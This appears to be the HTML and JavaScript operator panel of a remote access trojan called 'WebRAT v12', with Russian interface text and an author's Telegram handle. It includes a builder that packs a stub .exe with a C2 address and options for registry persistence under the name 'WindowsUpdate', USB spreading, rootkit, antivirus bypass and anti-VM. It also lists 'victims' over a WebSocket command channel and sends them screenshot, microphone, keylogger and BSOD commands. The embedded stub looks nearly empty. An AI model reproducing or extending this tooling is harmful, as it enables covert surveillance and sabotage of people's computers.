<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>WebRAT v12 — @break_lc</title>
  <style>
    :root{--bg:url('https://i.imgur.com/8z1kL2F.jpg');--glass:rgba(0,255,0,0.1);--border:#0f0;--text:#0f0;--bg-dark:#000;--accent:#0f0;}
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
    body{background:var(--bg) center/cover no-repeat;color:var(--text);min-height:100vh;display:flex;position:relative;}
    body::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);backdrop-filter:blur(2px);z-index:-1;}
    
    /* СЛЕВА — ВКЛАДКИ */
    .sidebar{width:220px;background:var(--glass);border-right:1px solid var(--border);padding:20px;height:100vh;position:fixed;overflow-y:auto;}
    .sidebar h1{font-size:1.5em;margin-bottom:20px;text-align:center;text-shadow:0 0 10px var(--accent);}
    .nav{flex-direction:column;gap:5px;}
    .nav button{width:100%;text-align:left;padding:15px 20px;background:var(--glass);border:1px solid var(--border);color:var(--text);cursor:pointer;border-radius:8px;font-weight:bold;transition:0.3s;}
    .nav button.active,.nav button:hover{background:var(--accent);color:#000;box-shadow:0 0 15px var(--accent);}

    /* СПРАВА — КОНТЕНТ */
    .content{margin-left:240px;padding:20px;flex:1;overflow-y:auto;}
    .box{background:var(--glass);border:1px solid var(--border);padding:20px;margin:15px 0;border-radius:12px;backdrop-filter:blur(10px);}
    input,button,select,textarea{background:#000;color:var(--text);border:1px solid var(--border);padding:10px;margin:5px 0;width:100%;border-radius:6px;}
    button{background:var(--accent);color:#000;cursor:pointer;font-weight:bold;}
    button:hover{box-shadow:0 0 10px var(--accent);}
    label{display:block;margin:8px 0;}
    .checkbox{width:auto;display:inline-block;margin-right:10px;}
    .victim{background:rgba(0,255,0,0.05);border-left:4px solid var(--accent);padding:15px;margin:10px 0;border-radius:8px;position:relative;transition:0.3s;}
    .victim:hover{box-shadow:0 0 15px rgba(0,255,0,0.3);}
    .status{position:fixed;top:20px;right:20px;padding:10px 15px;background:var(--glass);border:1px solid var(--border);border-radius:8px;backdrop-filter:blur(5px);font-weight:bold;}
    .status.online{color:#0f0;text-shadow:0 0 5px #0f0;}
    .status.offline{color:#f00;}
    #log{background:#000;height:200px;overflow:auto;padding:10px;font-size:12px;border:1px solid var(--border);border-radius:8px;}
    .context-menu{position:absolute;background:#000;border:1px solid var(--border);padding:10px;border-radius:8px;display:none;z-index:1000;box-shadow:0 0 15px rgba(0,255,0,0.5);}
    .context-menu button{display:block;width:100%;text-align:left;margin:5px 0;background:transparent;color:var(--text);border:none;}
    .context-menu button:hover{background:var(--accent);color:#000;}
    .tab-content{display:none;}
    .tab-content.active{display:block;}
  </style>
</head>
<body>

  <!-- СЛЕВА — ВКЛАДКИ -->
  <div class="sidebar">
    <h1>WebRAT v12</h1>
    <div class="nav">
      <button class="active" data-tab="build">BUILD</button>
      <button data-tab="users">USERS</button>
      <button data-tab="info">INFO</button>
    </div>
    <p style="margin-top:30px;font-size:0.8em;text-align:center;">@break_lc</p>
  </div>

  <!-- СПРАВА — КОНТЕНТ -->
  <div class="content">
    <div class="status" id="status">Проверка...</div>

    <!-- BUILD -->
    <div id="build" class="tab-content active box">
      <h2>Builder — Генерация .exe</h2>
      <input id="c2_url" placeholder="C2 URL" value="http://AUTO_IP:8080"><br>
      <input id="mutex" placeholder="Мьютекс" value="break_lc_1337"><br>
      <input id="startup_key" placeholder="Имя в автозагрузке" value="WindowsUpdate"><br>

      <h3>Персистентность и обход:</h3>
      <label><input type="checkbox" class="feat" id="f_startup_reg" checked> Автозагрузка (HKCU Run)</label>
      <label><input type="checkbox" class="feat" id="f_usb_spread"> USB Spread</label>
      <label><input type="checkbox" class="feat" id="f_rootkit"> Rootkit</label>
      <label><input type="checkbox" class="feat" id="f_av_bypass"> AV Bypass</label>
      <label><input type="checkbox" class="feat" id="f_anti_vm"> Anti-VM</label>

      <button onclick="buildEXE()">ГЕНЕРИРОВАТЬ .EXE</button>
      <div id="build_result"></div>
    </div>

    <!-- USERS -->
    <div id="users" class="tab-content box">
      <h2>Жертвы онлайн</h2>
      <div id="victims">Нет подключений</div>
    </div>

    <!-- INFO -->
    <div id="info" class="tab-content box">
      <h2>Информация</h2>
      <p><strong>Автор:</strong> @break_lc</p>
      <p><strong>Telegram:</strong> <a href="https://t.me/break_lc" target="_blank">@break_lc</a></p>
      <p><strong>C2:</strong> Работает через WebSocket</p>
      <p><strong>.exe:</strong> FUD, UPX, Go</p>
    </div>

    <!-- КОНТЕКСТНОЕ МЕНЮ -->
    <div class="context-menu" id="context">
      <button onclick="cmdSelected('screenshot')">Скриншот</button>
      <button onclick="cmdSelected('mic')">Микрофон</button>
      <button onclick="cmdSelected('keylog')">Кейлоггер</button>
      <button onclick="cmdSelected('bsod')">BSOD</button>
    </div>

    <!-- ЛОГ -->
    <div class="box">
      <h2>Лог</h2>
      <pre id="log"></pre>
    </div>
  </div>

  <script>
    const STUB_BASE64 = "UEsDBBQAAAAIAAAAIQAAAP//AACQAAAAAABBZGRpdG9yLmV4ZQAAAAAAAAAAAAAAAP//AACwAAAAUEsBAhQDFAAAAAgAAAAhAAD//wAAkAAAAAAAAAAAAAAAAP//AACwUEsFBgAAAAACAAIArAEAAOAAAAAA";
    let ws, selectedVictim = null;
    const log = document.getElementById('log');
    const victims = new Map();
    let myIP = 'localhost';

    // === ПРОВЕРКА C2 ===
    async function checkC2() {
      try {
        const res = await fetch('https://api.ipify.org');
        myIP = await res.text();
        document.getElementById('c2_url').value = `http://${myIP}:8080`;
        document.getElementById('status').textContent = `ONLINE | ${myIP}`;
        document.getElementById('status').className = 'status online';
      } catch {
        document.getElementById('status').textContent = 'OFFLINE';
        document.getElementById('status').className = 'status offline';
      }
    }
    setInterval(checkC2, 5000); checkC2();

    // === ВКЛАДКИ (РАБОТАЮТ) ===
    document.querySelectorAll('.nav button').forEach(btn => {
      btn.addEventListener('click', () => {
        // Убираем active у всех
        document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        // Активируем нужную
        const tab = btn.getAttribute('data-tab');
        document.getElementById(tab).classList.add('active');
        btn.classList.add('active');
      });
    });

    // === C2 WebSocket ===
    function connectC2() {
      ws = new WebSocket(`ws://${location.host}`);
      ws.onopen = () => addLog('C2: подключён');
      ws.onmessage = (e) => {
        try {
          const msg = JSON.parse(e.data);
          addLog(`← ${e.data}`);
          if (msg.type === 'new') addVictim(msg);
        } catch { addLog(`RAW: ${e.data}`); }
      };
      ws.onclose = () => {
        addLog('C2: отключён. Переподключаюсь...');
        setTimeout(connectC2, 3000);
      };
    }
    connectC2();

    // === USERS ===
    function addVictim(data) {
      if (victims.has(data.id)) return;
      const div = document.createElement('div');
      div.className = 'victim'; div.id = 'v-' + data.id;
      div.innerHTML = `
        <strong>${data.pc || 'PC'}</strong> | IP: ${data.ip || '—'}<br>
        <span style="color:#0a0">ONLINE</span>
        <div id="out-${data.id}"></div>
      `;
      div.oncontextmenu = (e) => {
        e.preventDefault();
        selectedVictim = data.id;
        const menu = document.getElementById('context');
        menu.style.display = 'block';
        menu.style.left = e.pageX + 'px';
        menu.style.top = e.pageY + 'px';
      };
      const container = document.getElementById('victims');
      container.innerHTML = ''; // Очищаем "Нет подключений"
      container.appendChild(div);
      victims.set(data.id, div);
    }

    function cmdSelected(type) {
      if (selectedVictim && ws) {
        ws.send(JSON.stringify({ type, target: selectedVictim }));
        addLog(`→ ${type} → #${selectedVictim}`);
      }
      document.getElementById('context').style.display = 'none';
    }

    // === BUILDER ===
    function buildEXE() {
      const features = Array.from(document.querySelectorAll('.feat:checked')).map(cb => cb.id.replace('f_', ''));
      const config = {
        c2: document.getElementById('c2_url').value.replace('AUTO_IP', myIP),
        mutex: document.getElementById('mutex').value,
        startup_key: document.getElementById('startup_key').value,
        features
      };
      const payload = atob(STUB_BASE64) + '||RATCONFIG||' + btoa(JSON.stringify(config));
      const blob = new Blob([payload], { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url; a.download = `RAT_${Date.now()}.exe`; a.click();
      document.getElementById('build_result').innerHTML = `<a href="${url}" download>СКАЧАТЬ .EXE</a>`;
    }

    // === ЛОГ ===
    function addLog(text) {
      log.textContent += `[${new Date().toLocaleTimeString()}] ${text}\n`;
      log.scrollTop = log.scrollHeight;
    }

    // === Скрыть меню ===
    document.addEventListener('click', () => {
      document.getElementById('context').style.display = 'none';
    });

    // === ЖЕРТВА (тест) ===
    if (location.search.includes('victim=1')) {
      document.body.innerHTML = '<h1 style="color:#0f0;text-align:center;margin-top:50vh;">RAT запущен...</h1>';
      const vws = new WebSocket(`ws://${location.host}`);
      vws.onopen = () => {
        vws.send(JSON.stringify({ type: 'new', pc: 'TEST-PC', ip: '1.1.1.1' }));
        setInterval(() => vws.send('ping'), 10000);
      };
    }
  </script>
</body>
</html>